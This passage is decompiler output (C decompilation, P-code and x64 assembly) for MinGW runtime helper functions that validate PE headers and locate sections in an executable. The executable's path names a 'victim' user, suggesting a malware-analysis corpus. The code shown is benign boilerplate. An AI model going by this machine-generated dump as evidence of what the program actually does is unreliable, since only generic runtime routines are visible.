 ---  CALL (ram, 0x1400081c8, 8) , (unique, 0x100000d1, 8)
 ---  BRANCH (ram, 0x1400021f2, 1)
(ram, 0x1400070e0, 8) MULTIEQUAL (ram, 0x1400070e0, 8) , (ram, 0x1400070e0, 8)
(ram, 0x1400070e8, 4) COPY (const, 0x1, 4)
(ram, 0x1400070e8, 4) MULTIEQUAL (ram, 0x1400070e8, 4) , (ram, 0x1400070e8, 4) , (ram, 0x1400070e8, 4) , (ram, 0x1400070e8, 4) , (ram, 0x1400070e8, 4) , (ram, 0x1400070e8, 4)
(ram, 0x1400070e0, 8) MULTIEQUAL (ram, 0x1400070e0, 8) , (ram, 0x1400070e0, 8) , (ram, 0x1400070e0, 8) , (ram, 0x1400070e0, 8) , (ram, 0x1400070e0, 8) , (ram, 0x1400070e0, 8)
(register, 0x0, 4) COPY (const, 0x1, 4)
(ram, 0x1400070e0, 8) COPY (ram, 0x1400070e0, 8)
(ram, 0x1400070e8, 4) COPY (ram, 0x1400070e8, 4)
 ---  RETURN (const, 0x0, 8) , (register, 0x0, 4)
(ram, 0x1400070e0, 8) INDIRECT (ram, 0x1400070e0, 8) , (const, 0xaa, 4)
(ram, 0x1400070e8, 4) INDIRECT (ram, 0x1400070e8, 4) , (const, 0xaa, 4)
 ---  CALL (ram, 0x140001900, 8)
(register, 0x0, 4) COPY (const, 0x1, 4)
(ram, 0x1400070e0, 8) COPY (ram, 0x1400070e0, 8)
(ram, 0x1400070e8, 4) COPY (ram, 0x1400070e8, 4)
 ---  RETURN (const, 0x0, 8) , (register, 0x0, 4)


Native Assembly Code:
PUSH RBX
SUB RSP,0x20
CMP EDX,0x2
JZ 0x140002290
JA 0x140002210
TEST EDX,EDX
JZ 0x140002230
MOV EAX,dword ptr [0x1400070e8]
TEST EAX,EAX
JZ 0x1400022b0
MOV dword ptr [0x1400070e8],0x1
MOV EAX,0x1
ADD RSP,0x20
POP RBX
RET
CMP EDX,0x3
JNZ 0x1400021fc
MOV EAX,dword ptr [0x1400070e8]
TEST EAX,EAX
JZ 0x1400021fc
CALL 0x140002060
JMP 0x1400021fc
MOV EAX,dword ptr [0x1400070e8]
TEST EAX,EAX
JNZ 0x1400022a0
MOV EAX,dword ptr [0x1400070e8]
CMP EAX,0x1
JNZ 0x1400021fc
MOV RBX,qword ptr [0x1400070e0]
TEST RBX,RBX
JZ 0x140002269
NOP dword ptr [RAX]
MOV RCX,RBX
MOV RBX,qword ptr [RBX + 0x10]
CALL 0x1400027d8
TEST RBX,RBX
JNZ 0x140002258
LEA RCX,[0x140007100]
MOV qword ptr [0x1400070e0],0x0
MOV dword ptr [0x1400070e8],0x0
CALL qword ptr [0x1400081b0]
JMP 0x1400021fc
CALL 0x140001900
MOV EAX,0x1
ADD RSP,0x20
POP RBX
RET
CALL 0x140002060
JMP 0x14000223a
LEA RCX,[0x140007100]
CALL qword ptr [0x1400081c8]
JMP 0x1400021f2




// Original file: C:\Users\victim\Downloads\babapro\ScnKopH.exe
Function: _ValidateImageBase
C Decompilation:

BOOL __cdecl _ValidateImageBase(PBYTE pImageBase)

{
  if ((*(short *)pImageBase == 0x5a4d) &&
     (*(int *)(pImageBase + *(int *)(pImageBase + 0x3c)) == 0x4550)) {
    return (BOOL)(*(short *)((longlong)(pImageBase + *(int *)(pImageBase + 0x3c)) + 0x18) == 0x20b);
  }
  return 0;
}



Pcode Representation:
(unique, 0x10000021, 8) CAST (register, 0x8, 8)
(unique, 0xda80, 2) LOAD (const, 0x1b1, 4) , (unique, 0x10000021, 8)
(register, 0x206, 1) INT_EQUAL (unique, 0xda80, 2) , (const, 0x5a4d, 2)
 ---  CBRANCH (ram, 0x1400022e8, 1) , (register, 0x206, 1)
(unique, 0x4400, 8) PTRADD (register, 0x8, 8) , (const, 0x3c, 8) , (const, 0x1, 8)
(unique, 0x10000029, 8) CAST (unique, 0x4400, 8)
(unique, 0xdb00, 4) LOAD (const, 0x1b1, 4) , (unique, 0x10000029, 8)
(register, 0x10, 8) INT_SEXT (unique, 0xdb00, 4)
(register, 0x8, 8) PTRADD (register, 0x8, 8) , (register, 0x10, 8) , (const, 0x1, 8)
(unique, 0x10000031, 8) CAST (register, 0x8, 8)
(unique, 0xdb80, 4) LOAD (const, 0x1b1, 4) , (unique, 0x10000031, 8)
(register, 0x206, 1) INT_EQUAL (unique, 0xdb80, 4) , (const, 0x4550, 4)
 ---  CBRANCH (ram, 0x1400022f0, 1) , (register, 0x206, 1)
(unique, 0x10000039, 8) CAST (register, 0x8, 8)
(unique, 0x10000041, 8) INT_ADD (unique, 0x10000039, 8) , (const, 0x18, 8)
(unique, 0x4400, 8) CAST (unique, 0x10000041, 8)
(unique, 0xda80, 2) LOAD (const, 0x1b1, 4) , (unique, 0x4400, 8)
(register, 0x206, 1) INT_EQUAL (unique, 0xda80, 2) , (const, 0x20b, 2)
(register, 0x0, 4) INT_ZEXT (register, 0x206, 1)
 ---  RETURN (const, 0x0, 8) , (register, 0x0, 4)
(register, 0x0, 4) COPY (const, 0x0, 4)
 ---  RETURN (const, 0x0, 8) , (register, 0x0, 4)


Native Assembly Code:
XOR EAX,EAX
CMP word ptr [RCX],0x5a4d
JNZ 0x1400022e8
MOVSXD RDX,dword ptr [RCX + 0x3c]
ADD RCX,RDX
CMP dword ptr [RCX],0x4550
JZ 0x1400022f0
RET
XOR EAX,EAX
CMP word ptr [RCX + 0x18],0x20b
SETZ AL
RET




// Original file: C:\Users\victim\Downloads\babapro\ScnKopH.exe
Function: _FindPESection
C Decompilation:

PIMAGE_SECTION_HEADER __cdecl _FindPESection(PBYTE pImageBase,DWORD_PTR rva)

{
  PIMAGE_SECTION_HEADER p_Var1;
  int iVar2;
  PIMAGE_SECTION_HEADER p_Var3;
  
  iVar2 = *(int *)(pImageBase + 0x3c);
  p_Var3 = (PIMAGE_SECTION_HEADER)
           (pImageBase +
           (ulonglong)*(ushort *)(pImageBase + (longlong)iVar2 + 0x14) + (longlong)iVar2 + 0x18);
  if (*(ushort *)(pImageBase + (longlong)iVar2 + 6) != 0) {
    p_Var1 = p_Var3 + (ulonglong)(*(ushort *)(pImageBase + (longlong)iVar2 + 6) - 1) + 1;
    do {
      if ((p_Var3->VirtualAddress <= rva) &&
         (rva < p_Var3->VirtualAddress + (p_Var3->Misc).PhysicalAddress)) {
        return p_Var3;
      }
      p_Var3 = p_Var3 + 1;
    } while (p_Var3 != p_Var1);
  }
  return (PIMAGE_SECTION_HEADER)0x0;
}



Pcode Representation:
(unique, 0x4400, 8) PTRADD (register, 0x8, 8) , (const, 0x3c, 8) , (const, 0x1, 8)
(unique, 0x10000072, 8) CAST (unique, 0x4400, 8)
(unique, 0xdb00, 4) LOAD (const, 0x1b1, 4) , (unique, 0x10000072, 8)
(register, 0x0, 8) INT_SEXT (unique, 0xdb00, 4)
(unique, 0x10000022, 8) INT_ADD (register, 0x0, 8) , (const, 0x14, 8)
(unique, 0x4400, 8) PTRADD (register, 0x8, 8) , (unique, 0x10000022, 8) , (const, 0x1, 8)
(unique, 0x1000007a, 8) CAST (unique, 0x4400, 8)
(unique, 0xda80, 2) LOAD (const, 0x1b1, 4) , (unique, 0x1000007a, 8)
(register, 0x0, 8) INT_ZEXT (unique, 0xda80, 2)
(register, 0x0, 8) INT_SEXT (unique, 0xdb00, 4)
(unique, 0x1000002a, 8) INT_ADD (register, 0x0, 8) , (const, 0x6, 8)
(unique, 0x4400, 8) PTRADD (register, 0x8, 8) , (unique, 0x1000002a, 8) , (const, 0x1, 8)
(unique, 0x10000082, 8) CAST (unique, 0x4400, 8)
(unique, 0xda80, 2) LOAD (const, 0x1b1, 4) , (unique, 0x10000082, 8)
(register, 0x0, 8) INT_SEXT (unique, 0xdb00, 4)
(unique, 0x10000032, 8) INT_ADD (register, 0x0, 8) , (const, 0x18, 8)
(unique, 0x1000003a, 8) INT_ADD (register, 0x0, 8) , (unique, 0x10000032, 8)
(unique, 0x1000008a, 8) PTRADD (register, 0x8, 8) , (unique, 0x1000003a, 8) , (const, 0x1, 8)
(unique, 0x4d00, 8) CAST (unique, 0x1000008a, 8)
(register, 0x206, 1) INT_NOTEQUAL (unique, 0xda80, 2) , (const, 0x0, 2)
 ---  CBRANCH (ram, 0x14000234d, 1) , (register, 0x206, 1)
(unique, 0x10000000, 4) INT_ZEXT (unique, 0xda80, 2)
(register, 0x8, 4) INT_SUB (unique, 0x10000000, 4) , (const, 0x1, 4)
(register, 0x8, 8) INT_ZEXT (register, 0x8, 4)
(unique, 0x1000004a, 8) INT_ADD (register, 0x8, 8) , (const, 0x1, 8)
(unique, 0x4d00, 8) PTRADD (unique, 0x4d00, 8) , (unique, 0x1000004a, 8) , (const, 0x28, 8)
(register, 0x0, 8) MULTIEQUAL (unique, 0x4d00, 8) , (register, 0x0, 8)
(unique, 0x4400, 8) PTRSUB (register, 0x0, 8) , (const, 0xc, 8)
(unique, 0xdb00, 4) LOAD (const, 0x1b1, 4) , (unique, 0x4400, 8)
(register, 0x80, 8) INT_ZEXT (unique, 0xdb00, 4)
(register, 0x200, 1) INT_LESSEQUAL (register, 0x80, 8) , (register, 0x10, 8)
 ---  CBRANCH (ram, 0x140002344, 1) , (register, 0x200, 1)
(unique, 0x4400, 8) PTRSUB (register, 0x0, 8) , (const, 0x8, 8)
(unique, 0x10000092, 8) PTRSUB (unique, 0x4400, 8) , (const, 0x0, 4)
(unique, 0xdb00, 4) LOAD (const, 0x1b1, 4) , (unique, 0x10000092, 8)
(register, 0x8, 4) INT_ADD (unique, 0xdb00, 4) , (unique, 0xdb00, 4)
(register, 0x8, 8) INT_ZEXT (register, 0x8, 4)
(register, 0x200, 1) INT_LESS (register, 0x10, 8) , (register, 0x8, 8)
 ---  CBRANCH (ram, 0x14000234f, 1) , (register, 0x200, 1)
(register, 0x0, 8) COPY (register, 0x0, 8)
 ---  RETURN (const, 0x0, 8) , (register, 0x0, 8)
(register, 0x0, 8) PTRADD (register, 0x0, 8) , (const, 0x1, 8) , (const, 0x28, 8)
(register, 0x206, 1) INT_NOTEQUAL (register, 0x0, 8) , (unique, 0x4d00, 8)
 ---  CBRANCH (ram, 0x140002330, 1) , (register, 0x206, 1)
(register, 0x0, 8) COPY (const, 0x0, 8)
 ---  RETURN (const, 0x0, 8) , (register, 0x0, 8)


Native Assembly Code:
MOVSXD RAX,dword ptr [RCX + 0x3c]
ADD RCX,RAX
MOVZX EAX,word ptr [RCX + 0x14]
MOVZX R8D,word ptr [RCX + 0x6]
LEA RAX,[RCX + RAX*0x1 + 0x18]
TEST R8W,R8W
JZ 0x14000234d
LEA ECX,[R8 + -0x1]
LEA RCX,[RCX + RCX*0x4]
LEA R9,[RAX + RCX*0x8 + 0x28]
NOP dword ptr [RAX + RAX*0x1]
MOV R8D,dword ptr [RAX + 0xc]
MOV RCX,R8
CMP RDX,R8
JC 0x140002344
ADD ECX,dword ptr [RAX + 0x8]
CMP RDX,RCX
JC 0x14000234f
ADD RAX,0x28
CMP RAX,R9
JNZ 0x140002330
XOR EAX,EAX
RET




// Original file: C:\Users\victim\Downloads\babapro\ScnKopH.exe
Function: _FindPESectionByName
C Decompilation:

/* WARNING: Unknown calling convention */

PIMAGE_SECTION_HEADER _FindPESectionByName(char *pName)

{
  PIMAGE_SECTION_HEADER p_Var1;
  int iVar2;
  size_t sVar3;
  int *piVar4;
  PIMAGE_SECTION_HEADER _Str1;
  
  sVar3 = strlen(pName);
  if (sVar3 < 9) {
    if (((*(short *)_refptr___ImageBase != 0x5a4d) ||
        (piVar4 = (int *)(_refptr___ImageBase + *(int *)(_refptr___ImageBase + 0x3c)),
        *piVar4 != 0x4550)) || (*(short *)(piVar4 + 6) != 0x20b)) {
      return (PIMAGE_SECTION_HEADER)0x0;
    }
    _Str1 = (PIMAGE_SECTION_HEADER)((longlong)piVar4 + (ulonglong)*(ushort *)(piVar4 + 5) + 0x18);
    if (*(ushort *)((longlong)piVar4 + 6) != 0) {
      p_Var1 = _Str1 + (ulonglong)(*(ushort *)((longlong)piVar4 + 6) - 1) + 1;
      do {
        iVar2 = strncmp((char *)_Str1,pName,8);
        if (iVar2 == 0) {
          return _Str1;
        }
        _Str1 = _Str1 + 1;
      } while (_Str1 != p_Var1);
    }
  }
  return (PIMAGE_SECTION_HEADER)0x0;
}



Pcode Representation:
(ram, 0x1400044e0, 8) INDIRECT (ram, 0x1400044e0, 8) , (const, 0x15, 4)
(register, 0x0, 8) CALL (ram, 0x140002808, 8) , (register, 0x8, 8)
(unique, 0xe680, 1) INT_LESS (register, 0x0, 8) , (const, 0x9, 8)
 ---  CBRANCH (ram, 0x1400023e0, 1) , (unique, 0xe680, 1)
(unique, 0x100000b6, 8) CAST (ram, 0x1400044e0, 8)
(unique, 0xda80, 2) LOAD (const, 0x1b1, 4) , (unique, 0x100000b6, 8)
(register, 0x206, 1) INT_NOTEQUAL (unique, 0xda80, 2) , (const, 0x5a4d, 2)
 ---  CBRANCH (ram, 0x1400023ce, 1) , (register, 0x206, 1)
(unique, 0x4400, 8) PTRADD (ram, 0x1400044e0, 8) , (const, 0x3c, 8) , (const, 0x1, 8)
(unique, 0x100000be, 8) CAST (unique, 0x4400, 8)
(unique, 0xdb00, 4) LOAD (const, 0x1b1, 4) , (unique, 0x100000be, 8)
(register, 0x0, 8) INT_SEXT (unique, 0xdb00, 4)
(unique, 0x100000c6, 8) PTRADD (ram, 0x1400044e0, 8) , (register, 0x0, 8) , (const, 0x1, 8)
(register, 0x0, 8) CAST (unique, 0x100000c6, 8)
(unique, 0xdb80, 4) LOAD (const, 0x1b1, 4) , (register, 0x0, 8)
(register, 0x206, 1) INT_NOTEQUAL (unique, 0xdb80, 4) , (const, 0x4550, 4)
 ---  CBRANCH (ram, 0x1400023ce, 1) , (register, 0x206, 1)
(unique, 0x4400, 8) PTRADD (register, 0x0, 8) , (const, 0x6, 8) , (const, 0x4, 8)
(unique, 0x100000ce, 8) CAST (unique, 0x4400, 8)
(unique, 0xda80, 2) LOAD (const, 0x1b1, 4) , (unique, 0x100000ce, 8)
(register, 0x206, 1) INT_NOTEQUAL (unique, 0xda80, 2) , (const, 0x20b, 2)
 ---  CBRANCH (ram, 0x1400023ce, 1) , (register, 0x206, 1)
(register, 0x0, 8) COPY (const, 0x0, 8)
(ram, 0x1400044e0, 8) COPY (ram, 0x1400044e0, 8)
 ---  RETURN (const, 0x0, 8) , (register, 0x0, 8)
(unique, 0x4400, 8) PTRADD (register, 0x0, 8) , (const, 0x5, 8) , (const, 0x4, 8)
(unique, 0x100000d6, 8) CAST (unique, 0x4400, 8)
(unique, 0xda80, 2) LOAD (const, 0x1b1, 4) , (unique, 0x100000d6, 8)
(register, 0x10, 8) INT_ZEXT (unique, 0xda80, 2)
(unique, 0x1000008e, 8) INT_ADD (register, 0x10, 8) , (const, 0x18, 8)
(unique, 0x100000de, 8) CAST (register, 0x0, 8)
(unique, 0x100000e6, 8) INT_ADD (unique, 0x100000de, 8) , (unique, 0x1000008e, 8)
(unique, 0x4d00, 8) CAST (unique, 0x100000e6, 8)
(unique, 0x100000ee, 8) CAST (register, 0x0, 8)
(unique, 0x100000f6, 8) INT_ADD (unique, 0x100000ee, 8) , (const, 0x6, 8)
(unique, 0x4400, 8) CAST (unique, 0x100000f6, 8)
(unique, 0xda80, 2) LOAD (const, 0x1b1, 4) , (unique, 0x4400, 8)
(register, 0x206, 1) INT_NOTEQUAL (unique, 0xda80, 2) , (const, 0x0, 2)
 ---  CBRANCH (ram, 0x1400023e0, 1) , (register, 0x206, 1)
(unique, 0x10000052, 4) INT_ZEXT (unique, 0xda80, 2)
(register, 0x0, 4) INT_SUB (unique, 0x10000052, 4) , (const, 0x1, 4)
(register, 0x0, 8) INT_ZEXT (register, 0x0, 4)
(unique, 0x1000009e, 8) INT_ADD (register, 0x0, 8) , (const, 0x1, 8)
(unique, 0x4d00, 8) PTRADD (unique, 0x4d00, 8) , (unique, 0x1000009e, 8) , (const, 0x28, 8)
 ---  BRANCH (ram, 0x1400023b9, 1)
(ram, 0x1400044e0, 8) MULTIEQUAL (ram, 0x1400044e0, 8) , (ram, 0x1400044e0, 8)
(register, 0x18, 8) MULTIEQUAL (unique, 0x4d00, 8) , (register, 0x18, 8)
(unique, 0x100000fe, 8) CAST (register, 0x18, 8)
(ram, 0x1400044e0, 8) INDIRECT (ram, 0x1400044e0, 8) , (const, 0x88, 4)
(register, 0x0, 4) CALL (ram, 0x140002810, 8) , (unique, 0x100000fe, 8) , (register, 0x8, 8) , (const, 0x8, 8)
(register, 0x206, 1) INT_EQUAL (register, 0x0, 4) , (const, 0x0, 4)
 ---  CBRANCH (ram, 0x1400023b0, 1) , (register, 0x206, 1)
(register, 0x0, 8) COPY (register, 0x18, 8)
(ram, 0x1400044e0, 8) COPY (ram, 0x1400044e0, 8)
 ---  RETURN (const, 0x0, 8) , (register, 0x0, 8)
(register, 0x18, 8) PTRADD (register, 0x18, 8) , (const, 0x1, 8) , (const, 0x28, 8)
(register, 0x206, 1) INT_NOTEQUAL (register, 0x18, 8) , (unique, 0x4d00, 8)
 ---  CBRANCH (ram, 0x1400023e0, 1) , (register, 0x206, 1)
(ram, 0x1400044e0, 8) MULTIEQUAL (ram, 0x1400044e0, 8) , (ram, 0x1400044e0, 8) , (ram, 0x1400044e0, 8)
(register, 0x0, 8) COPY (const, 0x0, 8)
(ram, 0x1400044e0, 8) COPY (ram, 0x1400044e0, 8)
 ---  RETURN (const, 0x0, 8) , (register, 0x0, 8)


Native Assembly Code:
PUSH RDI
PUSH RSI
PUSH RBX
SUB RSP,0x20
MOV RSI,RCX
CALL 0x140002808
CMP RAX,0x8
JA 0x1400023e0
MOV RDX,qword ptr [0x1400044e0]
XOR EBX,EBX
CMP word ptr [RDX],0x5a4d
JNZ 0x1400023ce
MOVSXD RAX,dword ptr [RDX + 0x3c]
ADD RAX,RDX
CMP dword ptr [RAX],0x4550
JNZ 0x1400023ce
CMP word ptr [RAX + 0x18],0x20b
JNZ 0x1400023ce
MOVZX EDX,word ptr [RAX + 0x14]
LEA RBX,[RAX + RDX*0x1 + 0x18]
MOVZX EDX,word ptr [RAX + 0x6]
TEST DX,DX
JZ 0x1400023e0
LEA EAX,[RDX + -0x1]
LEA RAX,[RAX + RAX*0x4]
LEA RDI,[RBX + RAX*0x8 + 0x28]
JMP 0x1400023b9
ADD RBX,0x28
CMP RBX,RDI
JZ 0x1400023e0
MOV R8D,0x8
MOV RDX,RSI
MOV RCX,RBX
CALL 0x140002810
TEST EAX,EAX
JNZ 0x1400023b0
MOV RAX,RBX
ADD RSP,0x20
POP RBX
POP RSI
POP RDI
RET
XOR EBX,EBX
MOV RAX,RBX
ADD RSP,0x20
POP RBX
POP RSI
POP RDI
RET




// Original file: C:\Users\victim\Downloads\babapro\ScnKopH.exe
Function: __mingw_GetSectionForAddress
C Decompilation:

/* WARNING: Unknown calling convention */

PIMAGE_SECTION_HEADER __mingw_GetSectionForAddress(LPVOID p)

{
  PIMAGE_SECTION_HEADER p_Var1;
  PIMAGE_SECTION_HEADER p_Var2;
  int *piVar3;
  
  if (((*(short *)_refptr___ImageBase == 0x5a4d) &&
      (piVar3 = (int *)(_refptr___ImageBase + *(int *)(_refptr___ImageBase + 0x3c)),
      *piVar3 == 0x4550)) && (*(short *)(piVar3 + 6) == 0x20b)) {
    p_Var2 = (PIMAGE_SECTION_HEADER)((longlong)piVar3 + (ulonglong)*(ushort *)(piVar3 + 5) + 0x18);
    if (*(ushort *)((longlong)piVar3 + 6) != 0) {
      p_Var1 = p_Var2 + (ulonglong)(*(ushort *)((longlong)piVar3 + 6) - 1) + 1;
      do {
        if (((ulonglong)p_Var2->VirtualAddress <=
             (ulonglong)((longlong)p - (longlong)_refptr___ImageBase)) &&
           ((ulonglong)((longlong)p - (longlong)_refptr___ImageBase) <
            (ulonglong)(p_Var2->VirtualAddress + (p_Var2->Misc).PhysicalAddress))) {
          return p_Var2;
        }
        p_Var2 = p_Var2 + 1;
      } while (p_Var2 != p_Var1);
    }
    return (PIMAGE_SECTION_HEADER)0x0;
  }
  return (PIMAGE_SECTION_HEADER)0x0;
}



Pcode Representation:
(register, 0x0, 8) COPY (const, 0x0, 8)
(unique, 0x10000084, 8) CAST (ram, 0x1400044e0, 8)
(unique, 0xda80, 2) LOAD (const, 0x1b1, 4) , (unique, 0x10000084, 8)
(register, 0x206, 1) INT_EQUAL (unique, 0xda80, 2) , (const, 0x5a4d, 2)
 ---  CBRANCH (ram, 0x140002410, 1) , (register, 0x206, 1)
(unique, 0x4400, 8) PTRADD (ram, 0x1400044e0, 8) , (const, 0x3c, 8) , (const, 0x1, 8)
(unique, 0x1000008c, 8) CAST (unique, 0x4400, 8)
(unique, 0xdb00, 4) LOAD (const, 0x1b1, 4) , (unique, 0x1000008c, 8)
(register, 0x80, 8) INT_SEXT (unique, 0xdb00, 4)
(unique, 0x10000094, 8) PTRADD (ram, 0x1400044e0, 8) , (register, 0x80, 8) , (const, 0x1, 8)
(register, 0x80, 8) CAST (unique, 0x10000094, 8)
(unique, 0xdb80, 4) LOAD (const, 0x1b1, 4) , (register, 0x80, 8)
(register, 0x206, 1) INT_EQUAL (unique, 0xdb80, 4) , (const, 0x4550, 4)
 ---  CBRANCH (ram, 0x140002418, 1) , (register, 0x206, 1)
(unique, 0x4400, 8) PTRADD (register, 0x80, 8) , (const, 0x6, 8) , (const, 0x4, 8)
(unique, 0x1000009c, 8) CAST (unique, 0x4400, 8)
(unique, 0xda80, 2) LOAD (const, 0x1b1, 4) , (unique, 0x1000009c, 8)
(register, 0x206, 1) INT_EQUAL (unique, 0xda80, 2) , (const, 0x20b, 2)
 ---  CBRANCH (ram, 0x140002410, 1) , (register, 0x206, 1)
(unique, 0x4400, 8) PTRADD (register, 0x80, 8) , (const, 0x5, 8) , (const, 0x4, 8)
(unique, 0x100000a4, 8) CAST (unique, 0x4400, 8)
(unique, 0xda80, 2) LOAD (const, 0x1b1, 4) , (unique, 0x100000a4, 8)
(register, 0x0, 8) INT_ZEXT (unique, 0xda80, 2)
(unique, 0x100000ac, 8) CAST (register, 0x8, 8)
(unique, 0x100000b4, 8) CAST (ram, 0x1400044e0, 8)
(register, 0x8, 8) INT_SUB (unique, 0x100000ac, 8) , (unique, 0x100000b4, 8)
(unique, 0x1000004c, 8) INT_ADD (register, 0x0, 8) , (const, 0x18, 8)
(unique, 0x100000bc, 8) CAST (register, 0x80, 8)
(unique, 0x100000c4, 8) INT_ADD (unique, 0x100000bc, 8) , (unique, 0x1000004c, 8)
(unique, 0x4d00, 8) CAST (unique, 0x100000c4, 8)
(unique, 0x100000cc, 8) CAST (register, 0x80, 8)
(unique, 0x100000d4, 8) INT_ADD (unique, 0x100000cc, 8) , (const, 0x6, 8)
(unique, 0x4400, 8) CAST (unique, 0x100000d4, 8)
(unique, 0xda80, 2) LOAD (const, 0x1b1, 4) , (unique, 0x4400, 8)
(register, 0x206, 1) INT_NOTEQUAL (unique, 0xda80, 2) , (const, 0x0, 2)
 ---  CBRANCH (ram, 0x14000246d, 1) , (register, 0x206, 1)
(unique, 0x10000018, 4) INT_ZEXT (unique, 0xda80, 2)
(register, 0x10, 4) INT_SUB (unique, 0x10000018, 4) , (const, 0x1, 4)
(register, 0x10, 8) INT_ZEXT (register, 0x10, 4)
(unique, 0x1000005c, 8) INT_ADD (register, 0x10, 8) , (const, 0x1, 8)
(unique, 0x4d00, 8) PTRADD (unique, 0x4d00, 8) , (unique, 0x1000005c, 8) , (const, 0x28, 8)
(register, 0x0, 8) MULTIEQUAL (unique, 0x4d00, 8) , (register, 0x0, 8)
(unique, 0x4400, 8) PTRSUB (register, 0x0, 8) , (const, 0xc, 8)
(unique, 0xdb00, 4) LOAD (const, 0x1b1, 4) , (unique, 0x4400, 8)
(register, 0x80, 8) INT_ZEXT (unique, 0xdb00, 4)
(unique, 0x100000dc, 8) CAST (register, 0x8, 8)
(register, 0x200, 1) INT_LESSEQUAL (register, 0x80, 8) , (unique, 0x100000dc, 8)
 ---  CBRANCH (ram, 0x140002464, 1) , (register, 0x200, 1)
(unique, 0x4400, 8) PTRSUB (register, 0x0, 8) , (const, 0x8, 8)
(unique, 0x100000e4, 8) PTRSUB (unique, 0x4400, 8) , (const, 0x0, 4)
(unique, 0xdb00, 4) LOAD (const, 0x1b1, 4) , (unique, 0x100000e4, 8)
(register, 0x10, 4) INT_ADD (unique, 0xdb00, 4) , (unique, 0xdb00, 4)
(register, 0x10, 8) INT_ZEXT (register, 0x10, 4)
(unique, 0x100000ec, 8) CAST (register, 0x8, 8)
(register, 0x200, 1) INT_LESS (unique, 0x100000ec, 8) , (register, 0x10, 8)
 ---  CBRANCH (ram, 0x140002410, 1) , (register, 0x200, 1)
(register, 0x0, 8) COPY (register, 0x0, 8)
(ram, 0x1400044e0, 8) COPY (ram, 0x1400044e0, 8)
 ---  RETURN (const, 0x0, 8) , (register, 0x0, 8)
(register, 0x0, 8) PTRADD (register, 0x0, 8) , (const, 0x1, 8) , (const, 0x28, 8)
(register, 0x206, 1) INT_NOTEQUAL (register, 0x0, 8) , (unique, 0x4d00, 8)
 ---  CBRANCH (ram, 0x140002450, 1) , (register, 0x206, 1)
(register, 0x0, 8) COPY (const, 0x0, 8)
(ram, 0x1400044e0, 8) COPY (ram, 0x1400044e0, 8)
 ---  RETURN (const, 0x0, 8) , (register, 0x0, 8)
(ram, 0x1400044e0, 8) COPY (ram, 0x1400044e0, 8)
 ---  RETURN (const, 0x0, 8) , (register, 0x0, 8)


Native Assembly Code:
MOV RDX,qword ptr [0x1400044e0]
XOR EAX,EAX
CMP word ptr [RDX],0x5a4d
JNZ 0x140002410
MOVSXD R8,dword ptr [RDX + 0x3c]
ADD R8,RDX
CMP dword ptr [R8],0x4550
JZ 0x140002418
RET
CMP word ptr [R8 + 0x18],0x20b
JNZ 0x140002410
MOVZX EAX,word ptr [R8 + 0x14]
SUB RCX,RDX
LEA RAX,[R8 + RAX*0x1 + 0x18]
MOVZX R8D,word ptr [R8 + 0x6]
TEST R8W,R8W
JZ 0x14000246d
LEA EDX,[R8 + -0x1]
LEA RDX,[RDX + RDX*0x4]
LEA R9,[RAX + RDX*0x8 + 0x28]
NOP word ptr CS:[RAX + RAX*0x1]
MOV R8D,dword ptr [RAX + 0xc]
MOV RDX,R8
CMP RCX,R8
JC 0x140002464
ADD EDX,dword ptr [RAX + 0x8]
CMP RCX,RDX
JC 0x140002410
ADD RAX,0x28
CMP RAX,R9
JNZ 0x140002450
XOR EAX,EAX
RET




// Original file: C:\Users\victim\Downloads\babapro\ScnKopH.exe
Function: __mingw_GetSectionCount
C Decompilation:

/* WARNING: Unknown calling convention */

int __mingw_GetSectionCount(void)

{
  int *piVar1;
  
  if (((*(short *)_refptr___ImageBase == 0x5a4d) &&
      (piVar1 = (int *)(_refptr___ImageBase + *(int *)(_refptr___ImageBase + 0x3c)),
      *piVar1 == 0x4550)) && (*(short *)(piVar1 + 6) == 0x20b)) {
    return (uint)*(ushort *)((longlong)piVar1 + 6);
  }
  return 0;
}



Pcode Representation:
(unique, 0x1000001a, 8) CAST (ram, 0x1400044e0, 8)
(unique, 0xda80, 2) LOAD (const, 0x1b1, 4) , (unique, 0x1000001a, 8)
(register, 0x206, 1) INT_EQUAL (unique, 0xda80, 2) , (const, 0x5a4d, 2)
 ---  CBRANCH (ram, 0x14000248f, 1) , (register, 0x206, 1)
(unique, 0x4400, 8) PTRADD (ram, 0x1400044e0, 8) , (const, 0x3c, 8) , (const, 0x1, 8)
(unique, 0x10000022, 8) CAST (unique, 0x4400, 8)
(unique, 0xdb00, 4) LOAD (const, 0x1b1, 4) , (unique, 0x10000022, 8)
(register, 0x10, 8) INT_SEXT (unique, 0xdb00, 4)
(unique, 0x1000002a, 8) PTRADD (ram, 0x1400044e0, 8) , (register, 0x10, 8) , (const, 0x1, 8)
(register, 0x0, 8) CAST (unique, 0x1000002a, 8)
(unique, 0xdb80, 4) LOAD (const, 0x1b1, 4) , (register, 0x0, 8)
(register, 0x206, 1) INT_EQUAL (unique, 0xdb80, 4) , (const, 0x4550, 4)
 ---  CBRANCH (ram, 0x140002498, 1) , (register, 0x206, 1)
(unique, 0x4400, 8) PTRADD (register, 0x0, 8) , (const, 0x6, 8) , (const, 0x4, 8)
(unique, 0x10000032, 8) CAST (unique, 0x4400, 8)
(unique, 0xda80, 2) LOAD (const, 0x1b1, 4) , (unique, 0x10000032, 8)
(register, 0x206, 1) INT_EQUAL (unique, 0xda80, 2) , (const, 0x20b, 2)
 ---  CBRANCH (ram, 0x14000248f, 1) , (register, 0x206, 1)
(unique, 0x1000003a, 8) CAST (register, 0x0, 8)
(unique, 0x10000042, 8) INT_ADD (unique, 0x1000003a, 8) , (const, 0x6, 8)
(unique, 0x4400, 8) CAST (unique, 0x10000042, 8)
(unique, 0xda80, 2) LOAD (const, 0x1b1, 4) , (unique, 0x4400, 8)
(register, 0x8, 4) INT_ZEXT (unique, 0xda80, 2)
(register, 0x0, 4) COPY (register, 0x8, 4)
(ram, 0x1400044e0, 8) COPY (ram, 0x1400044e0, 8)
 ---  RETURN (const, 0x0, 8) , (register, 0x0, 4)
(register, 0x0, 4) COPY (const, 0x0, 4)
(ram, 0x1400044e0, 8) COPY (ram, 0x1400044e0, 8)
 ---  RETURN (const, 0x0, 8) , (register, 0x0, 4)


Native Assembly Code:
MOV RAX,qword ptr [0x1400044e0]
XOR ECX,ECX
CMP word ptr [RAX],0x5a4d
JNZ 0x14000248f
MOVSXD RDX,dword ptr [RAX + 0x3c]
ADD RAX,RDX
CMP dword ptr [RAX],0x4550
JZ 0x140002498
MOV EAX,ECX
RET
CMP word ptr [RAX + 0x18],0x20b
JNZ 0x14000248f
